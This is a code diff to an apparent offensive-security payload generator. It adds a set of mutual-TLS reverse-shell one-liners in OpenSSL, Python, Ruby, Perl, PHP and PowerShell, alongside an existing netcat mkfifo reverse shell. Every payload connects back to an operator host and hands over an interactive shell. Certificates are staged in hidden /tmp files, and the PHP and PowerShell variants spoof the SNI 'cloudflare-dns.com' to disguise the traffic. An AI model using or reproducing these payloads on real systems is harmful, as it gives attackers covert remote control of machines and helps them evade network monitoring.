@@ -1,4 +1,4 @@
-def get_payloads(host, revshell_port, tls_port):
+def get_payloads(host, revshell_port, tls_port, mtls_port):
     return {
         'Network Tools': {
             'nc mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {revshell_port} >/tmp/f',
@@ -131,6 +131,135 @@ def get_payloads(host, revshell_port, tls_port):
                 f'crystal eval \'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);'
                 f'c.connect("{host}",{revshell_port});loop{{m,l=c.receive;p=Process.new(m.rstrip("\\n"),'
                 f'output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}}\''
+            ),
+        },
+        'mTLS (client-cert required)': {
+            '__note__': (
+                'Target must already have the client certificate bundle on disk. Either: '
+                'stage it manually — '
+                'Linux: /tmp/.mtls_client.pem + /tmp/.mtls_client.key + /tmp/.mtls_ca.pem ; '
+                'Windows: C:\\Windows\\Temp\\mtls_client.pfx — '
+                'or run the "upgrade_mtls" plugin, which uploads the bundle, '
+                'launches the mTLS shell, and removes the bundle afterwards.'
+            ),
+
+            'OpenSSL s_client': (
+                f'rm -f /tmp/.mtls_f; mkfifo /tmp/.mtls_f; '
+                f'sh -i < /tmp/.mtls_f 2>&1 | '
+                f'openssl s_client -quiet -connect {host}:{mtls_port} '
+                f'-cert /tmp/.mtls_client.pem -key /tmp/.mtls_client.key -CAfile /tmp/.mtls_ca.pem '
+                f'-verify_return_error 2>/dev/null > /tmp/.mtls_f; '
+                f'rm -f /tmp/.mtls_f'
+            ),
+            'Python3 (ssl context)': (
+                f'rm -f /tmp/.mtls_f; mkfifo /tmp/.mtls_f; '
+                f'sh -i < /tmp/.mtls_f 2>&1 | '
+                f'python3 -c \''
+                f'import ssl,socket,sys,select;'
+                f'ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);'
+                f'ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;'
+                f'ctx.load_cert_chain("/tmp/.mtls_client.pem","/tmp/.mtls_client.key");'
+                f's=ctx.wrap_socket(socket.create_connection(("{host}",{mtls_port})),server_hostname="{host}");'
+                f'exec("while True:\\n'
+                f' r,_,_=select.select([s,sys.stdin],[],[])\\n'
+                f' for io in r:\\n'
+                f'  try:\\n'
+                f'   if io is s:\\n'
+                f'    d=s.recv(4096)\\n'
+                f'    if not d: sys.exit()\\n'
+                f'    sys.stdout.buffer.write(d); sys.stdout.buffer.flush()\\n'
+                f'   else:\\n'
+                f'    d=sys.stdin.buffer.read1(4096)\\n'
+                f'    if not d: sys.exit()\\n'
+                f'    s.sendall(d)\\n'
+                f'  except Exception: sys.exit()")'
+                f'\' > /tmp/.mtls_f; '
+                f'rm -f /tmp/.mtls_f'
+            ),
+            'Ruby (OpenSSL)': (
+                f'rm -f /tmp/.mtls_f; mkfifo /tmp/.mtls_f; '
+                f'sh -i < /tmp/.mtls_f 2>&1 | '
+                f'ruby -rsocket -ropenssl -e \''
+                f'ctx=OpenSSL::SSL::SSLContext.new;'
+                f'ctx.cert=OpenSSL::X509::Certificate.new(File.read("/tmp/.mtls_client.pem"));'
+                f'ctx.key=OpenSSL::PKey::RSA.new(File.read("/tmp/.mtls_client.key"));'
+                f'ctx.ca_file="/tmp/.mtls_ca.pem";'
+                f'ctx.verify_mode=OpenSSL::SSL::VERIFY_NONE;'
+                f't=TCPSocket.new("{host}",{mtls_port});'
+                f's=OpenSSL::SSL::SSLSocket.new(t,ctx);s.sync_close=true;s.connect;'
+                f'$stdout.sync=true;'
+                f'loop{{r,_,_=IO.select([s,$stdin]);'
+                f'r.each{{|io|'
+                f'begin;'
+                f'if io==s;$stdout.write(s.readpartial(4096));'
+                f'else;s.write($stdin.readpartial(4096));end;'
+                f'rescue EOFError;exit;end}}}}'
+                f'\' > /tmp/.mtls_f; '
+                f'rm -f /tmp/.mtls_f'
+            ),
+            'Perl (IO::Socket::SSL)': (
+                f'rm -f /tmp/.mtls_f; mkfifo /tmp/.mtls_f; '
+                f'sh -i < /tmp/.mtls_f 2>&1 | '
+                f'perl -MIO::Socket::SSL -MIO::Select -e \''
+                f'$s=IO::Socket::SSL->new('
+                f'PeerHost=>"{host}",PeerPort=>{mtls_port},'
+                f'SSL_cert_file=>"/tmp/.mtls_client.pem",'
+                f'SSL_key_file=>"/tmp/.mtls_client.key",'
+                f'SSL_ca_file=>"/tmp/.mtls_ca.pem",'
+                f'SSL_verify_mode=>0,SSL_verifycn_scheme=>"none"'
+                f') or die;'
+                f'$s->autoflush(1);STDOUT->autoflush(1);'
+                f'$sel=IO::Select->new($s,\\*STDIN);'
+                f'while(1){{'
+                f'for $fh ($sel->can_read){{'
+                f'if($fh==$s){{sysread($s,$b,4096) or exit;print $b}}'
+                f'else{{sysread(STDIN,$b,4096) or exit;syswrite($s,$b)}}'
+                f'}}}}'
+                f'\' > /tmp/.mtls_f; '
+                f'rm -f /tmp/.mtls_f'
+            ),
+            'PHP (mTLS)': (
+                f"php -r '"
+                f'$c=stream_context_create(["ssl"=>['
+                f'"local_cert"=>"/tmp/.mtls_client.pem",'
+                f'"local_pk"=>"/tmp/.mtls_client.key",'
+                f'"cafile"=>"/tmp/.mtls_ca.pem",'
+                f'"verify_peer"=>false,"verify_peer_name"=>false,"allow_self_signed"=>true,'
+                f'"SNI_enabled"=>true,"peer_name"=>"cloudflare-dns.com"]]);'
+                f'$s=stream_socket_client("ssl://{host}:{mtls_port}",$e,$m,30,STREAM_CLIENT_CONNECT,$c);'
+                f'if(!$s){{fwrite(STDERR,"$m\\n");exit(1);}}'
+                f'$p=proc_open("/bin/sh -i",[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]],$q);'
+                f'stream_set_blocking($s,false);stream_set_blocking($q[1],false);stream_set_blocking($q[2],false);'
+                f'while(true){{'
+                f'$r=[$s,$q[1],$q[2]];$w=null;$x=null;'
+                f'if(stream_select($r,$w,$x,5)===false)break;'
+                f'foreach($r as $f){{'
+                f'$d=fread($f,4096);'
+                f'if($d===false||$d===""){{if(feof($f))break 2;continue;}}'
+                f'if($f===$s){{fwrite($q[0],$d);fflush($q[0]);}}'
+                f'else{{fwrite($s,$d);fflush($s);}}'
+                f'}}}}'
+                f"'"
+            ),
+            'PowerShell (Modify PFX password)': (
+                "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; "
+                rf"$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('C:\Windows\Temp\mtls_client.pfx','<PFX_Password>'); "
+                "$certColl = New-Object System.Security.Cryptography.X509Certificates.X509CertificateCollection; "
+                "$certColl.Add($cert); "
+                f"$TCPClient = New-Object Net.Sockets.TCPClient('{host}', {mtls_port}); "
+                "$NetworkStream = $TCPClient.GetStream(); "
+                "$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback])); "
+                "$SslStream.AuthenticateAsClient('cloudflare-dns.com',$certColl,$sslProtocols,$false); "
+                "if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit} "
+                "$StreamWriter = New-Object IO.StreamWriter($SslStream); "
+                "function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}; "
+                "WriteToStream ''; "
+                "while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {"
+                "$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
+                "$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}"
+                "WriteToStream ($Output)"
+                "}"
+                "$StreamWriter.Close()"
             ),
         },
     }
